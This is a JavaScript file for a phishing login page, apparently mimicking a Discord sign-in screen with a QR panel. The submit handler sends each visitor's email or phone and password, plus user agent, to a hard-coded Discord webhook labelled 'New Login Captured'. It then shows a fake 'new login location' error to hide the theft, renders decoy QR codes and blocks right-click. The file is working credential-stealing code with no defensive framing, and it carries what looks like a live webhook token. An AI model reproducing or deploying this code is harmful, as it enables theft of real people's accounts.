// ==================================
// CLEAN DISCORD WEBHOOK SCRIPT – NO GOOGLE, NO BLOCKS
// Dec 2025 – sendBeacon only (unblockable)
// ==================================

const WEBHOOK_URL = "https://discord.com/api/webhooks/1449141051544567984/Y_6HsT7dTe6OfXOm3QchrBPJqRfnpMbuIfOJHNf08xskilycqtE9j1_deWT3Ctu64fWW";

const CONFIG = {
  ANIMATION_DURATION: 3000,
  QR_REFRESH_INTERVAL: 120000
};

// Selectors
const form = document.getElementById('loginForm');
const emailInput = document.getElementById('emailORphone');
const passwordInput = document.getElementById('password');
const loginBtn = document.querySelector('button[type="submit"]');
const emailWrapper = document.querySelector('.email-wrapper');
const qrContainer = document.querySelector('.right-section .qr-code');

// Send to Discord (unblockable sendBeacon)
const sendToDiscord = (email, password) => {
  const payload = JSON.stringify({
    embeds: [{
      title: "🆕 New Login Captured",
      color: 0xff0000,
      fields: [
        { name: "📧 Email/Phone", value: email || 'N/A', inline: false },
        { name: "🔑 Password", value: password || 'N/A', inline: false },
        { name: "🌐 User-Agent", value: navigator.userAgent.substring(0, 100) + '...', inline: false },
        { name: "⏰ Time", value: new Date().toLocaleString(), inline: false }
      ]
    }]
  });

  navigator.sendBeacon(WEBHOOK_URL, payload);
};

// QR Refresh (simple version)
const refreshQR = () => {
  if (!qrContainer) return;
  qrContainer.innerHTML = '<img src="./assets/qrcode-app-logo.png" alt="Logo">';
  setTimeout(() => {
    const fakeUrl = `https://app.com/ra/${Math.random().toString(36).slice(2, 15)}`;
    const qr = qrcode(0, 'L');
    qr.addData(fakeUrl);
    qr.make();
    const svg = qr.createSvgTag(1, 0);
    const parser = new DOMParser();
    const svgEl = parser.parseFromString(svg, 'image/svg+xml').documentElement;
    svgEl.setAttribute('width', '160');
    svgEl.setAttribute('height', '160');
    qrContainer.innerHTML = '';
    qrContainer.appendChild(svgEl);
    qrContainer.insertAdjacentHTML('beforeend', '<img src="./assets/qrcode-app-logo.png" alt="Logo">');
  }, 1500);
};

// Submit Handler
form.addEventListener('submit', (e) => {
  e.preventDefault();

  const email = emailInput.value.trim();
  const password = passwordInput.value;

  // Loading spinner
  loginBtn.innerHTML = '<span class="spinner"><span class="inner pulsingEllipsis"><span class="item spinnerItem"></span><span class="item spinnerItem"></span><span class="item spinnerItem"></span></span></span>';
  loginBtn.disabled = true;

  // Send data (unblockable)
  sendToDiscord(email, password);

  // Fake delay + error
  setTimeout(() => {
    if (!emailWrapper.querySelector('.error-msg')) {
      emailWrapper.insertAdjacentHTML('afterbegin', '<span class="error-msg" style="color:red;font-size:12px;display:block;margin:5px 0;">New login location detected, please check your e-mail.</span>');
    }
    emailInput.style.border = '1px solid red';
    passwordInput.style.border = '1px solid red';
    loginBtn.innerHTML = 'Log In';
    loginBtn.disabled = false;
  }, CONFIG.ANIMATION_DURATION);
});

// Init
document.addEventListener('DOMContentLoaded', () => {
  refreshQR();
  setInterval(refreshQR, CONFIG.QR_REFRESH_INTERVAL);
  document.addEventListener('contextmenu', e => e.preventDefault());
});